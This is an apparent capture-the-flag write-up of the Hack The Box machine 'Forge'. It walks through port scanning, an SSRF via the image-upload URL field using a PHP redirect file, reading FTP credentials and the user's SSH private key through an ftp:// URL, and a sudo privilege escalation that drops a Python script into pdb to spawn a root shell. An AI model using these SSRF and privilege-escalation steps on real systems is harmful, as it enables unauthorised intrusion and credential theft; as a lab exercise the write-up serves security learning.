# Forge

Forge is a medium Linux machine released on 11/09/2021.

**Note**: this write-up is quite short and concise as it's based on really brief notes that were taken just for convenience during the pwning of the machine. 

## Enumeration

As usual we start by performing a port scan with nmap

```
nmap -A 10.10.11.111 -p- | tee portscan.txt

Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-16 08:00 EST
Nmap scan report for forge.htb (10.10.11.111)
Host is up (0.065s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.67 seconds
```

The web server has an upload seciton where you can upload images, but you can actually upload any kind of file.
Uploading a PHP web shell does not work since the server tries to show the php file as an image.


We try enumerating virtual hosts with gobuster

`gobuster vhost -u http://forge.htb -w <wordlist>`

and we find out that admin.forge.htb returns a 200

We add admin.forge.htb to our /etc/hosts and we try to access the page from the browser.
It returns 'Only localhost is allowed!".

## Foothold

The upload page also accepts URLs, so there seems to be room for a SSRF (Server Side Request **Forgery** (mind the name of the machine!))

We setup a php web server in our machine, with the following index.php file

```php
<?php

	header("location: http://admin.forge.htb");
?>
```

and in the upload file of the site we just write

http://\<our IP\>


Now, when the server tries to fetch the image from the link we have passed, it will be redirected to "admin.forge.htb"
and will actually upload to the 'uploads' directory the web page we cannot access directly. 

We get the admin portal and it contains an href to the /announcements page

We modify the location header in our PHP file and we perform another SSRF.

The announcements page contains credentials for the ftp server:
`user:heightofsecurity123!`

It also contains some useful information:


```
- An internal ftp server has been setup with credentials as user:heightofsecurity123!
- The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.
- The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<url>.
```

We still cannot access the ftp server on the machine since the portscan showed us that port 21 is filtered (i.e. only accessible
locally). We still have to perform SSRFs


You can access an FTP server via URL by specifying the ftp:// protocol.
You can also use credentials by specifying the url in the following form:

ftp://username:password@ftp.xyz.com


Therefore we change our location header in the PHP file as follows:

```php
header("location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@localhost/");
```

and now we can access all the files in the user home directory.

First thing first we retrieve the flag. Then there is a 'snap' folder but nothing useful seems to be inside it.

We check if there is a .ssh folder in the home directory, and in fact there is, so we copy the private key from .ssh/id_rsa
and now we can ssh into the machine as 'user'.

We now have a shell on the machine. The shell sucks but whatever.

## Privesc

Let's run `sudo -l` to see if we can run commands with root privilege.

```
User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```    
Good, let's take a look at the remote-manage.py script.

It starts listening for connections from localhost and then executes some system commands with `subprocess` depending on what the user asks.

Commands are called without absolute path, so one could think to exploit the `PATH` env variable and make the script execute what they want.

I could not do this, probably because of some security measures implemented on sudo.

The way to root is actually much easier:

connecting and sending an empty string, will throw an exception and the script will fall back to `pdb` (python debugger) in post-mortem mode.

From here, we can simply spawn a root shell with

```py
import pty
pty.spawn("/bin/bash")
```